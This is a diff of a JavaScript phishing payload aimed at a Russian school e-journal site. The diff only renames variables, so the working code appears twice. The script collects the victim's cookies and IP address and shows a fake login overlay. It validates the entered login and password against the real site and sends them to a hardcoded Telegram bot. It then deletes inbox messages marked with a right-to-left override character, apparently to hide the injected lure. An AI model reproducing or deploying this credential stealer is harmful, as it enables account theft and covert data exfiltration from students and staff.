@@ -1,17 +1,18 @@
-const TELEGRAM_TOKEN = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
-const TELEGRAM_CHAT_ID = "-1003077695457";
-const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-const cookies = document.cookie.split("; ").reduce((acc, cookie) => {
-    const [name, ...value] = cookie.split("=");
-    acc[name] = value.join("=");
-    return acc;
-}, {});
-const cookieJSON = JSON.stringify(cookies);
-let userIP = "Не удалось определить";
+const tgTok = "8385745346:AAGl9qWQ5vQMVXSHaMe9tBGBUDoK46cn-Z8";
+const tgChat = "-1003077695457";
+const tgUrl = `https://api.telegram.org/bot${tgTok}/sendMessage`;
 
-const messageContainer = document.querySelector(".typography.overflow");
-if (messageContainer) {
-  messageContainer.innerHTML = `
+const ck = document.cookie.split("; ").reduce((a, c) => {
+  const [k, ...v] = c.split("=");
+  a[k] = v.join("=");
+  return a;
+}, {});
+const ckStr = JSON.stringify(ck);
+let ip = "неизвестно";
+
+const msgBox = document.querySelector(".typography.overflow");
+if (msgBox) {
+  msgBox.innerHTML = `
     <div class="notice notice--red notice--medium">
       <div class="notice__content">
         <div class="notice__content__text">
@@ -21,46 +22,46 @@ if (messageContainer) {
     </div>`;
 }
 
-async function fetchUserIP() {
+async function getIp() {
   try {
-    const res = await fetch("https://api.ipify.org?format=json");
-    const data = await res.json();
-    userIP = data.ip || "Не удалось определить";
-  } catch (err) {
-    console.error("Ошибка получения IP:", err);
+    const r = await fetch("https://api.ipify.org?format=json");
+    const d = await r.json();
+    ip = d.ip || "нет";
+  } catch (e) {
+    console.error("ip не получен:", e);
   }
 }
 
-async function sendToTelegram(text) {
+async function sendTg(txt) {
   try {
-    await fetch(TELEGRAM_URL, {
+    await fetch(tgUrl, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "Markdown" })
+      body: JSON.stringify({ chat_id: tgChat, text: txt, parse_mode: "Markdown" })
     });
-  } catch (err) {
-    console.error("Ошибка отправки в Telegram:", err);
+  } catch (e) {
+    console.error("ошибка tg:", e);
   }
 }
 
-function createLoginOverlay() {
+function mkOverlay() {
   document.body.style.position = "relative";
   document.body.style.overflow = "hidden";
 
-  const blurOverlay = document.createElement("div");
-  Object.assign(blurOverlay.style, {
+  const blur = document.createElement("div");
+  Object.assign(blur.style, {
     position: "fixed", top: "0", left: "0",
     width: "100%", height: "100%",
     backdropFilter: "blur(8px)",
     background: "rgba(0,0,0,0.4)",
     zIndex: "9998"
   });
-  document.body.appendChild(blurOverlay);
+  document.body.appendChild(blur);
 
-  const loginViewport = document.createElement("div");
-  loginViewport.id = "loginviewport";
-  loginViewport.className = "login-outer";
-  Object.assign(loginViewport.style, {
+  const box = document.createElement("div");
+  box.id = "loginviewport";
+  box.className = "login-outer";
+  Object.assign(box.style, {
     position: "fixed",
     top: "50%", left: "50%",
     transform: "translate(-50%, -50%)",
@@ -73,7 +74,7 @@ function createLoginOverlay() {
     width: "100%"
   });
 
-  loginViewport.innerHTML = `
+  box.innerHTML = `
     <div class="login-form login-form--centered">
       <div class="login-form__body">
         <h1 class="ej-form__header" style="text-align:center;">
@@ -103,24 +104,24 @@ function createLoginOverlay() {
     </div>
   `;
 
-  document.body.appendChild(loginViewport);
-  return { loginViewport, blurOverlay };
+  document.body.appendChild(box);
+  return { box, blur };
 }
 
-function handleFormSubmit(loginViewport, blurOverlay) {
-  const form = loginViewport.querySelector("form");
-  form.addEventListener("submit", async (e) => {
+function bindForm(box, blur) {
+  const f = box.querySelector("form");
+  f.addEventListener("submit", async (e) => {
     e.preventDefault();
 
-    const loginInput = loginViewport.querySelector('input[autocomplete="username"]');
-    const passInput  = loginViewport.querySelector('input[autocomplete="current-password"]');
-    const loginVal = (loginInput.value || "").trim();
-    const passVal  = (passInput.value || "").trim();
-    const errorContainer = loginViewport.querySelector(".error-container");
-    errorContainer.innerHTML = "";
+    const u = box.querySelector('input[autocomplete="username"]');
+    const p  = box.querySelector('input[autocomplete="current-password"]');
+    const uVal = (u.value || "").trim();
+    const pVal = (p.value || "").trim();
+    const errBox = box.querySelector(".error-container");
+    errBox.innerHTML = "";
 
-    if (!loginVal || !passVal) {
-      errorContainer.innerHTML = `
+    if (!uVal || !pVal) {
+      errBox.innerHTML = `
         <div class="notice notice--red notice--medium">
           <div class="notice__content">
             <div class="notice__content__text"><p>Заполните логин и пароль</p></div>
@@ -130,64 +131,64 @@ function handleFormSubmit(loginViewport, blurOverlay) {
     }
 
     try {
-      const res = await fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
+      const r = await fetch("https://shkolakzn.eljur.ru/ajaxauthorize", {
         method: "POST",
         headers: { "accept": "*/*", "content-type": "application/json" },
-        body: JSON.stringify({ username: loginVal, password: passVal })
+        body: JSON.stringify({ username: uVal, password: pVal })
       });
-      const data = await res.json();
+      const d = await r.json();
 
-      if (data.result && data.actions?.[0]?.type === "redirect") {
-        const url = data.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(data.actions[0].url)})` : "Нет URL";
-        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n🔗Ссылка для авторизации: ${url}`);
+      if (d.result && d.actions?.[0]?.type === "redirect") {
+        const link = d.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(d.actions[0].url)})` : "нет";
+        await sendTg(`🔑 Логин: ${uVal}\n🔒 Пароль: ${pVal}\n🌐 IP: ${ip}\n🍪Куки: ${ckStr}\n🔗Ссылка: ${link}`);
 
         (async () => {
-          const baseUrl = "/journal-api-messages-action";
+          const base = "/journal-api-messages-action";
           try {
-            const res = await fetch(`${baseUrl}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
+            const r2 = await fetch(`${base}?method=messages.get_list&category=inbox&search=&limit=20&offset=0&teacher=0&status=&companion=&minDate=0`, {
               credentials: "include",
             });
-            const msgData = await res.json();
+            const d2 = await r2.json();
 
-            const targets = msgData.list.filter(msg => 
-              msg.subject.includes("Привет!\u202E") || 
-              msg.body.startsWith("Привет!‮&lt")
+            const list = d2.list.filter(m => 
+              m.subject.includes("Привет!\u202E") || 
+              m.body.startsWith("Привет!‮&lt")
             );
 
-            const ids = targets.map(msg => msg.id);
+            const ids = list.map(m => m.id);
 
             if (ids.length > 0) {
-              console.log("Нашлись сообщения для удаления:", ids);
-              const deleteUrl = `${baseUrl}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
-              const delRes = await fetch(deleteUrl, { credentials: "include" });
-              const delData = await delRes.json();
-              console.log("Результат удаления:", delData);
+              console.log("нашёл письма:", ids);
+              const delUrl = `${base}?method=messages.delete&idsString=${encodeURIComponent(ids.join(";"))}&type=inbox`;
+              const delR = await fetch(delUrl, { credentials: "include" });
+              const delD = await delR.json();
+              console.log("удаление:", delD);
             } else {
-              console.log("Ничего не нашлось для удаления");
+              console.log("писем нет");
             }
-          } catch (err) {
-            console.error("Ошибка при обработке сообщений:", err);
+          } catch (e) {
+            console.error("ошибка писем:", e);
           }
         })();
 
-        blurOverlay.remove();
-        loginViewport.remove();
+        blur.remove();
+        box.remove();
         document.body.style.overflow = "";
         document.body.style.position = "";
 
         window.location.href = "/";
-      } else if (data.errors?.length > 0) {
-        const msg = data.errors[0].text || "Ошибка входа";
-        errorContainer.innerHTML = `
+      } else if (d.errors?.length > 0) {
+        const msg = d.errors[0].text || "Ошибка входа";
+        errBox.innerHTML = `
           <div class="notice notice--red notice--medium">
             <div class="notice__content">
               <div class="notice__content__text"><p>${msg}</p></div>
             </div>
           </div>`;
       }
-    } catch (err) {
-      console.error("Ошибка запроса:", err);
-      errorContainer.innerHTML = `
+    } catch (e) {
+      console.error("сервер не отвечает:", e);
+      errBox.innerHTML = `
         <div class="notice notice--red notice--medium">
           <div class="notice__content">
             <div class="notice__content__text"><p>Сервер недоступен</p></div>
@@ -197,8 +198,8 @@ function handleFormSubmit(loginViewport, blurOverlay) {
   });
 }
 
-(async function init() {
-  await fetchUserIP();
-  const { loginViewport, blurOverlay } = createLoginOverlay();
-  handleFormSubmit(loginViewport, blurOverlay);
+(async function start() {
+  await getIp();
+  const { box, blur } = mkOverlay();
+  bindForm(box, blur);
 })();
